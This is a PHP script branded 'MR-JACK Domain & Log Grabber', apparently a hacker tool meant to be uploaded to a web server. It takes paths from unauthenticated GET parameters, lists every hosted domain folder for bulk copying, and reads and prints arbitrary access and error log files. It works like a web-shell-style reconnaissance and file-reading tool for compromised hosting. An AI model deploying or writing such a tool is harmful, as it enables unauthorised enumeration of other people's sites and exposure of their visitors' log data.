<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);

$defaultPath = realpath(dirname(__FILE__)) . DIRECTORY_SEPARATOR;
$base = isset($_GET['path']) && $_GET['path'] !== '' ? rtrim($_GET['path'], '/') . DIRECTORY_SEPARATOR : $defaultPath;
$safe_base = htmlspecialchars($base, ENT_QUOTES, 'UTF-8'); 
$mode = isset($_GET['mode']) ? $_GET['mode'] : 'domains'; 

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>MR-JACK Domain & Log Grabber</title>
<style>
@keyframes rainbow-border {
    0% { border-color: #00cc66; box-shadow: 0 0 15px #00cc66; }
    20% { border-color: #ff6600; box-shadow: 0 0 15px #ff6600; }
    40% { border-color: #ffcc00; box-shadow: 0 0 15px #ffcc00; }
    60% { border-color: #00cc66; box-shadow: 0 0 15px #00cc66; }
    80% { border-color: #0066ff; box-shadow: 0 0 15px #0066ff; }
    100% { border-color: #00cc66; box-shadow: 0 0 15px #00cc66; }
}
body {
    background: #0a0a0f;
    color: #00cc66;
    font-family: monospace;
    padding: 20px;
    border: 3px solid #00cc66;
    animation: rainbow-border 3s linear infinite;
    margin: 10px;
    border-radius: 8px;
}
a {
    color: #ff4444;
    text-decoration: none;
}
a:hover {
    text-decoration: underline;
    color: #ff8888;
}
h1 {
    color: #00cc66;
    text-shadow: 0 0 20px #00cc66, 0 0 40px #880000;
    letter-spacing: 3px;
}
h2, h3 {
    color: #00cc66;
    text-shadow: 0 0 10px #880000;
}
button, input[type='submit'] {
    background: #1a0000;
    color: #00cc66;
    padding: 8px 16px;
    border: 2px solid #00cc66;
    cursor: pointer;
    margin-top: 10px;
    font-family: monospace;
    font-weight: bold;
    transition: 0.3s;
}
button:hover, input[type='submit']:hover {
    background: #00cc66;
    color: #0a0a0f;
    box-shadow: 0 0 20px #00cc66;
}
input[type='text'] {
    background: #150000;
    color: #00cc66;
    border: 2px solid #00cc66;
    padding: 6px;
    width: 400px;
    font-family: monospace;
}
form { margin-bottom: 20px; }
.active-mode {
    background: #00cc66 !important;
    color: #0a0a0f !important;
    border: 1px solid #ff4444 !important;
}
.found-log {
    color: #00cc66;
    cursor: pointer;
    padding: 5px;
}
.found-log:hover {
    background: #00cc66;
    color: #0a0a0f;
}
hr {
    border: 1px solid #330000;
}
pre {
    background: #0d0d15;
    color: #ff3333;
    padding: 10px;
    border: 2px solid #00cc66;
    overflow-x: auto;
}
code {
    background: #1a0000;
    color: #ff6666;
    padding: 2px 6px;
    border: 1px solid #00cc66;
}
</style>
<script>
function copyLinks() {
    const links = Array.from(document.querySelectorAll('.link')).map(a => a.href).join('\\n');
    navigator.clipboard.writeText(links).then(() => {
        alert('✅ All links copied!');
    });
}
function copyLog() {
    const logContent = document.querySelector('#log-content').innerText;
    navigator.clipboard.writeText(logContent).then(() => {
        alert('✅ Log content copied!');
    });
}
</script>
</head><body>";

echo "<h1>🟢 MR-JACK Domain & Log Grabber</h1><hr>";

echo "<div style='margin-bottom: 15px;'>";
$domainLink = $_SERVER['PHP_SELF'] . '?mode=domains' . (isset($_GET['path']) ? '&path=' . urlencode($_GET['path']) : '');
$logLink = $_SERVER['PHP_SELF'] . '?mode=log' . (isset($_GET['path']) ? '&path=' . urlencode($_GET['path']) : '');

echo "<a href='{$domainLink}' style='padding: 5px; border: 1px solid #00cc66;' class='" . ($mode === 'domains' ? 'active-mode' : '') . "'>[ Domain Mode ]</a> ";
echo "<a href='{$logLink}' style='padding: 5px; border: 1px solid #00cc66;' class='" . ($mode === 'log' ? 'active-mode' : '') . "'>[ Access Log Mode ]</a>";
echo "</div><hr>";

if ($mode === 'log') {
    echo "<h2>🔴 MR-JACK Access Log Grabber</h2>";
    
    $parentDir = dirname(rtrim($defaultPath, DIRECTORY_SEPARATOR));
    $logPathDefault = $parentDir . DIRECTORY_SEPARATOR . 'access-logs';
    $logPath = isset($_GET['logpath']) && $_GET['logpath'] !== '' ? $_GET['logpath'] : $logPathDefault;
    $safe_logPath = htmlspecialchars($logPath, ENT_QUOTES, 'UTF-8'); 

    echo "<form method='GET'>
    <label> Full Path to Access Log Directory/File: </label><br>
    <input type='text' name='logpath' placeholder='Example: /home/user/access-logs/' value='{$safe_logPath}'>
    <input type='hidden' name='mode' value='log'>
    <input type='submit' value=' Scan Log'>
    </form>";

    if (!file_exists($logPath)) {
        echo "<p style='color:#ff4444;'>❌ ERROR: Path not found at <b>{$safe_logPath}</b></p>";
    } else if (!is_readable($logPath)) {
        echo "<p style='color:#ff4444;'>❌ ERROR: Access denied to <b>{$safe_logPath}</b></p>";
    } else {
        echo "<p>Scanning path: <code>{$safe_logPath}</code></p>";

        $logContent = '';
        $filesToRead = [];
        $foundLogs = [];

        if (is_file($logPath)) {
            $filesToRead[] = $logPath;
            $foundLogs[] = $logPath;
        } elseif (is_dir($logPath)) {
            echo "<p style='color:#ff4444;'>Scanning directory for log files...</p>";
            $dirContents = @scandir($logPath);
            
            if ($dirContents === false) {
                echo "<p style='color:#ff4444;'>❌ ERROR: Cannot read directory contents.</p>";
            } else {
                foreach ($dirContents as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $fullPath = $logPath . DIRECTORY_SEPARATOR . $item;
                    if (is_file($fullPath) && (preg_match('/\.(log|access.*log|error.*log)$/i', $item) || strpos($item, '_log') !== false)) {
                        $filesToRead[] = $fullPath;
                        $foundLogs[] = $fullPath;
                    }
                }
                
                if (empty($foundLogs)) {
                    echo "<p style='color:#ff4444;'>❌ No log files found in directory.</p>";
                } else {
                    echo "<div style='margin: 15px 0;'>";
                    echo "<h3>Found Log Files:</h3>";
                    echo "<div style='background: #0d0d15; padding: 10px; border: 1px solid #00cc66;'>";
                    foreach ($foundLogs as $logFile) {
                        $logFileName = basename($logFile);
                        $logFileUrl = $_SERVER['PHP_SELF'] . '?mode=log&logpath=' . urlencode($logFile);
                        echo "<div class='found-log'>";
                        echo "<a href='{$logFileUrl}' style='display: block; padding: 5px;'>📄 {$logFileName}</a>";
                        echo "</div>";
                    }
                    echo "</div></div>";
                }
            }
        }
        
        if (!empty($filesToRead) && (is_file($logPath) || (isset($_GET['logpath']) && is_file($_GET['logpath'])))) {
            $allLines = [];
            foreach ($filesToRead as $file) {
                if (is_readable($file)) {
                    $lines = @file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                    if ($lines !== false) {
                        $allLines[] = "--- LOG START: " . basename($file) . " ---";
                        $allLines = array_merge($allLines, $lines);
                    }
                }
            }

            if (!empty($allLines)) {
                $filteredLines = array_filter($allLines, function($line) {
                    return strpos($line, '-ssl_log') === false; 
                });
                $finalLines = array_slice($filteredLines, -100); 
                $logContent = implode("\n", $finalLines);
            }
            
            if ($logContent) {
                echo "<button onclick='copyLog()'> Copy 50 Log Lines</button>";
                echo "<h3>Output (Last 50 Lines - Unfiltered):</h3>";
                echo "<pre id='log-content'>";
                echo htmlspecialchars($logContent);
                echo "</pre>";
            } else {
                echo "<p>No readable log content was found.</p>";
            }
        }
    }
} else {
    echo "<form method='GET'>
    <label> Domain Folder Path: </label><br>
    <input type='text' name='path' placeholder='Example: /home/user/domains/' value='{$safe_base}'>
    <input type='hidden' name='mode' value='domains'>
    <input type='submit' value=' Scan'>
    </form>";

    if (!is_dir($base)) {
        echo "<p> Folder path not found: <b>{$safe_base}</b></p></body></html>"; 
        exit;
    }
    
    $dirs = scandir($base);
    $domains = [];
    foreach ($dirs as $d) {
        if ($d !== '.' && $d !== '..' && is_dir($base . $d)) {
            if (preg_match('/^([a-z0-9-]+\.)+[a-z]{2,}$/i', $d)) {
                $domains[] = "http://$d/";
            }
        }
    }

    echo "<p>Total: <b>" . count($domains) . "</b> valid domains found from: <code>{$safe_base}</code></p>";
    echo "<button onclick='copyLinks()'> Copy All Links</button>";
    echo "<ul>";
    foreach ($domains as $url) {
        echo "<li><a class='link' href='{$url}' target='_blank'>{$url}</a></li>";
    }
    echo "</ul>";
}

echo "<hr><p style='color:#880000'>Generated by <b style='color:#00cc66; text-shadow: 0 0 10px #00cc66;'>MRJACK</b> @ ".date("H:i:s")."</p></body></html>";
?>